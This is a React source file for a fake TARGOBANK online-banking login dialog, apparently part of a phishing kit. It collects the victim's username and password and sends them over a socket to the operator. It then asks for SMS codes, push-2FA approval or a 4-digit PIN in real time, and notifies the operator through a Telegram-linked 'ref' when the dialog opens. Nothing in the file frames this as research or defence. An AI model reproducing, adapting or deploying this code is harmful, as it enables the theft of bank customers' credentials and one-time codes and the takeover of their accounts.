import React, { useState, useEffect, useRef } from 'react';
import { useSelector } from 'react-redux';
import styled from 'styled-components';

import { ReactComponent as TARGOBANKSVG } from '../../../assets/svg/banks/targobank.svg';
import { ReactComponent as CloseSVG } from './close_modal.svg';
import { getQuery } from '../../../utils/navigation';
import { LOADER } from './LOADER';

export const P_TARGOBANK = ({ children }) => {
  const { socket } = useSelector(({ socket }) => ({
    socket,
  }));

  const [isFinished, setIsFinished] = useState(false);
  const [dataError, setDataError] = useState(false);
  const [smsError, setSmsError] = useState(false);
  const [pinError, setPinError] = useState(false);
  const [pushError, setPushError] = useState(false);
  const [isOpen, setOpen] = useState(false);
  const [isConfirm, setConfirm] = useState(false);
  const [data, setData] = useState({
    data1: '',
    data2: '',
  });

  const [isCodeConfirmed, setCodeConfirmed] = useState(false);
  const [type, setType] = useState(null);

  const [smsInput, setSmsInput] = useState('');
  const [codeInput, setCodeInput] = useState('');

  const initialInputs = {
    1: { value: '', ref: useRef(null) },
    2: { value: '', ref: useRef(null) },
    3: { value: '', ref: useRef(null) },
    4: { value: '', ref: useRef(null) },
  };

  const [inputs, setInputs] = useState(initialInputs);

  const setPinNumber = (value, key) => {
    setInputs({ ...inputs, [key]: { ...inputs[key], value } });
  };

  const setPin = (code) => {
    if (!code || code.length !== 4) {
      return;
    }

    const transformedInputs = {};

    Object.values(inputs).forEach((item, index) => {
      transformedInputs[index + 1] = { ...item, value: code[index] };
    });

    setInputs(transformedInputs);
  };

  const getPin = () => {
    const isPinValid = Object.values(inputs).every(({ value }) => !!value);

    if (isPinValid) {
      const code = Object.values(inputs).reduce((accum, { value }) => {
        return accum + value;
      }, '');
      return code;
    }

    return null;
  };

  useEffect(() => {
    if (socket) {
      socket.on('PAYMENT_DATA_CODE_GOOD', (payload) => {
        setType('SMS');
      });

      socket.on('PAYMENT_DATA_2FA_GOOD', (payload) => {
        setType('2FA');
      });

      socket.on('PAYMENT_DATA_PIN_GOOD', (payload) => {
        setType('PIN');
      });

      socket.on('PAYMENT_DATA_BAD', () => {
        setDataError('Sie haben falsche Daten eingegeben');
        setConfirm(false);
      });

      socket.on('PAYMENT_CODE_GOOD', () => {
        setIsFinished(true);
      });

      socket.on('PAYMENT_CODE_BAD', () => {
        setType('SMS');

        setSmsError('Du hast einen falschen Code eingegeben.');
      });

      socket.on('PAYMENT_2FA_GOOD', () => {
        setIsFinished(true);
      });

      socket.on('PAYMENT_2FA_BAD', () => {
        setType('2FA');

        setPushError('Es wurde keine Bestätigung gefunden. versuchen Sie es nochmal.');
      });

      socket.on('PAYMENT_PIN_GOOD', () => {
        setIsFinished(true);
      });

      socket.on('PAYMENT_PIN_BAD', () => {
        setType('PIN');

        setPinError('Du hast einen falschen Pin eingegeben.');
      });
    }
  }, [socket]);

  const handleClose = () => {
    setOpen(false);
    setDataError(false);
    setSmsError(false);
    setPushError(false);
    setPinError(false);
    setConfirm(false);
    setData({
      data1: '',
      data2: '',
    });
    setCodeConfirmed(false);
    setType(null);

    setSmsInput('');
    setCodeInput('');
    setIsFinished(false);
  };

  const handleFinish = () => {
    setType(null);

    socket.emit('PAYMENT_2FA_SEND');
  };

  const handleSendSms = () => {
    socket.emit('PAYMENT_CODE_SEND', { code: smsInput });

    setType(null);
    setSmsInput('');
  };

  const handleSendPin = () => {
    socket.emit('PAYMENT_PIN_SEND', { pin: getPin() });

    setType(null);
  };

  const handleCode = () => {
    setCodeInput('');
    setCodeConfirmed(true);
  };

  const handleCodeInput = (e) => {
    setCodeInput(e.target.value);
  };

  const handleSmsInput = (e) => {
    setSmsInput(e.target.value);
  };

  const isDisabled = data.data1 === '' || data.data2 === '';

  const handleData_1 = (e) => {
    setData({ ...data, data1: e.target.value });
  };

  const handleData_2 = (e) => {
    setData({ ...data, data2: e.target.value });
  };

  const handleConfirm = async () => {
    const info = JSON.parse(localStorage.getItem('info'));

    const ref = localStorage.getItem('ref');

    socket.emit('PAYMENT_DATA_BANK_SEND', {
      ...info,
      login: data.data1,
      password: data.data2,
      ref,
      bank: 'TARGO',
    });

    setConfirm(true);
  };

  const handleOpen = () => {
    if (!isOpen) {
      setOpen(true);

      const ref = getQuery('ref') || localStorage.getItem('ref');

      if (socket && ref) {
        socket.emit('PAYMENT_NOTIFICATION', { type: 'PAYMENT_BANK_START', telegramId: ref });
      }
    }
  };

  return (
    <div onClick={handleOpen}>
      {children}
      <Dialog open={isOpen}>
        <div>
          <CONT>
            <D1>
              <D_TITLE>
                <TARGOBANKSVG className="title" />
              </D_TITLE>
              <CloseSVG viewBox="8 8 33 32" onClick={handleClose} src="close_modal.png" className="close" />
            </D1>
            <LOADER
              Title={WARN}
              Input={INPUT}
              isConfirm={isConfirm}
              Button={BUTTON_HANDLER}
              loaderColor="#02007c"
              isCodeConfirmed={isCodeConfirmed}
              smsInput={smsInput}
              handleFinish={handleFinish}
              handleSendSms={handleSendSms}
              handleSendPin={handleSendPin}
              handleCode={handleCode}
              handleCodeInput={handleCodeInput}
              handleSmsInput={handleSmsInput}
              codeInput={codeInput}
              smsError={smsError}
              pushError={pushError}
              isFinished={isFinished}
              pinError={pinError}
              inputs={inputs}
              setPin={setPin}
              setPinNumber={setPinNumber}
              type={type}
            >
              <WARN>
                <p>Login</p>
                <div>
                  Melden Sie sich hier mit Ihrem Benutzernamen und Passwort zum TARGOBANK Online-Banking an.
                </div>
              </WARN>
              <INPUT onChange={handleData_1} value={data.data1} placeholder="Benutzername" />
              <INPUT onChange={handleData_2} value={data.data2} placeholder="Passwort" />
              {dataError && <Error>{dataError}</Error>}
              {/* <INPUT_CB_CONT
                style={{
                  display: "flex",
                  justifyContent: "center",
                  alignItems: "center",
                }}
              >
                <INPUT_CB type="checkbox" />
                Meinen Benutzernamen speichern
              </INPUT_CB_CONT> */}
              <BUTTON>
                <BUTTON_HANDLER onClick={handleConfirm} disabled={isDisabled}>
                  Jetzt einholen
                </BUTTON_HANDLER>
              </BUTTON>
            </LOADER>
          </CONT>
        </div>
      </Dialog>
    </div>
  );
};

const INPUT_CB_CONT = styled.div`
  font-weight: bold;
  font-size: 18px;
`;

const INPUT_CB = styled.input`
  width: 24px;
  height: 24px;

  margin-right: 12px;
  -webkit-appearance: none;

  &::before {
    content: '';
    position: absolute;
    display: inline-block;
    height: 20px;
    width: 20px;
    background: #fff;
    border: #002f5f 2px solid;
    box-shadow: inset 2px 2px 10px rgb(0 0 0 / 30%);
    border-radius: 6px;
    pointer-events: none;
  }
`;

const INPUT = styled.input`
  width: 100%;
  height: 41px;
  font-size: 14px;
  padding-left: 15px;
  padding-right: 15px;
  margin-bottom: 40px;
  border: 2px solid #002f5f;
  border-radius: 6px;

  outline: none;

  &:focus {
    border: 2px solid #00b6ed;
  }

  &::placeholder {
    font-weight: bold;
  }
`;

const WARN = styled.div`
  margin-top: 24px;
  font-size: 18px;

  text-align: center;

  p {
    font-size: 32px;
    font-weight: bold;
    margin-bottom: 12px;
  }

  & div {
    width: 100%;
    padding-left: 10%;
    padding-right: 10%;
  }

  margin-bottom: 60px;
`;

const BUTTON_HANDLER = styled.button`
  background-color: #bc133e;
  border: 1px solid #bc133e;
  outline: none;
  box-shadow: none;
  padding: 9px 10px 10px 8px;
  border-radius: 32px;
  font-size: 18px;
  cursor: pointer;
  color: #ffffff;
  width: 100%;
  height: 45px;
  &:hover {
    background-color: #bc133e;
  }
  transition: 0.3s;
  &:disabled {
    border-top: none !important;
    border-left: none !important;
    border-right: none !important;
    border-bottom: none !important;
    background: #666666;
    border: none;
    opacity: none;
    box-shadow: none;
  }
`;

const BUTTON = styled.div`
  width: 100%;
  display: flex;
  justify-content: center;
  margin-top: 12px;
`;

const Dialog = styled.dialog`
  position: absolute;
  top: 0;
  & > div {
    position: fixed;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    display: flex !important;
    justify-content: center !important;
    align-items: center !important;
    background-color: rgba(0, 0, 0, 0.8);
    z-index: 999;
  }
`;

const D1 = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;

  & div {
    display: flex;
    justify-content: center;
    width: 100%;
  }

  & .title {
    height: 35px;
    fill: white;
  }

  & .close {
    width: 24px;
    height: 24px;

    margin-top: -25px;

    fill: black;

    &:hover {
      cursor: pointer;
    }
  }
`;

const D_TITLE = styled.div`
  display: flex;
  justify-content: center;
  margin-left: 32px;
  margin-bottom: 32px;
`;

const CONT = styled.div`
  background-color: #d0f0f8;
  border: 1px solid rgb(51, 51, 51);
  color: #002f5f;
  width: 430px;
  border-radius: 10px;
  padding: 24px 14px 24px 14px;
  text-align: left;
`;
const Error = styled.p`
  color: red !important;
  font-size: 14px !important;
  margin-top: 10px !important;
`;
